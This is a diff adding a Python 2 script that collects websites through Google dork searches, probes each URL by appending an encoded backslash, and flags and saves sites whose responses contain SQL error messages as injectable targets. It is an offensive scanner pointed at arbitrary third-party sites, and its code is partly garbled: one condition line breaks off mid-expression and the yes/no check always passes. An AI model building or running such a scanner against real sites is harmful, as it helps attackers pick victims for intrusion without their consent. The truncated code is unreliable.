@@ -1,0 +1,92 @@
+ # coding: utf-8
+
+import sys
+import os
+
+
+try:
+    from googlesearch import search
+except:
+       print ("[#] Install: pip2 install google")
+       exit()
+
+try:
+    from colorama import *
+
+except:
+       print ("[#] Install: pip2 install colorama")
+       exit()
+
+try:
+    import requests
+
+except:
+       print ("[#] Install: pip2 install requests")
+       exit()
+
+
+print ( Fore.RED + Style.BRIGHT +  """
+██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗
+██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗
+██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║
+██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║
+██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝
+╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝ \n""" + Fore.RESET + Style.RESET_ALL)
+
+sites = open("WebSites.txt",'w')
+
+logs = []
+try:
+    lista = sys.argv[1]
+except:
+       print (Style.BRIGHT + "[!] Usage: " + sys.argv[0] + " <dorks.txt>" + Style.RESET_ALL)
+       sys.exit()
+
+with open(lista) as lisa:
+     word = lisa.readlines()
+     for wordlist in word:
+         for url in search(wordlist, stop=20):
+             print (Style.BRIGHT + '[+] Website: ' + Fore.GREEN + url + Fore.RESET + Style.RESET_ALL)
+             logs.append(url+'\n')
+
+sites.writelines(logs)
+sites.close()
+
+sql = open("VullSQL.txt",'w')
+save = []
+kkk = "%5c"
+
+print
+esc = raw_input(Style.BRIGHT + Fore.CYAN + "[#] Deseja Verificar Errors De SQLI [Y/N] " + Fore.RESET + Style.RESET_ALL)
+print
+
+if esc == 'Y' or 'y':
+   with open('WebSites.txt') as tw:
+        sc = tw.readlines()
+        for jk in sc:
+            print
+            xy = jk.rstrip('\n')
+            xz = kkk.rstrip('\n')
+            xyz = xy+xz
+
+            up = requests.get(xyz,headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'},timeout=10)
+            if "mysql_num_rows()" in up.text or "Mysql" in up.text or "Sql syntax" in up.text or "Warning: mysql_fetch_array()" in up.text or "valid MySQL result" in up.text or "MySqlClient." in up.text or "mysql_fetch_assoc()" in up.text or "mysql_fetch_array" in up.text or "session_start()"in up.text or "getimagesize()" in up.text or "is_writable" in up.text or "unknown()" in up.text or "mysql_result()" in up.text or "pg_exec()" in up.text or "mysql_query()" in up.text or  "array_merge" in up.text or >
+                print (Style.BRIGHT + "[+] Sql injetion: " + Fore.GREEN + xy + Fore.RESET + Style.RESET_ALL)
+                save.append(xy+'\n')
+            else:
+                 print (Style.BRIGHT + "[-] Not SQL Injetion: " + Fore.RED + xy + Fore.RESET + Style.RESET_ALL)
+
+elif esc == 'N':
+    print ("[!] Fechando Programa...")
+    exit()
+
+elif esc == 'n':
+    print ("[!] Fechando Programa...")
+    exit()
+
+else:
+    "[!] Fail"
+    exit()
+
+sql.writelines(save)
+sql.close()
